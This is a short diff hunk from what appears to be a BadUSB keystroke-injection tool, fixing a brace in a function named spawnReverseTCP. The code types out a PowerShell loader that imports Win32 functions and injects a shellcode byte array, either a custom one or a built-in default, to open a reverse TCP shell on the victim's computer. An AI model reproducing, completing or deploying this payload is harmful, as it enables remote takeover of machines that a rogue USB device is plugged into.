@@ -185,7 +185,7 @@ void spawnReverseTCP()
     Keyboard.print(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
     Keyboard.print("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
     Keyboard.print(";[Byte[]]$sc = ");
-    if (custom == true)) 
+    if (custom == true) {
         Keyboard.print(shellcode); // Print out the custom shellcode if custom
     }                              // is set to true
     else {  // Otherwise use the normal shellcode
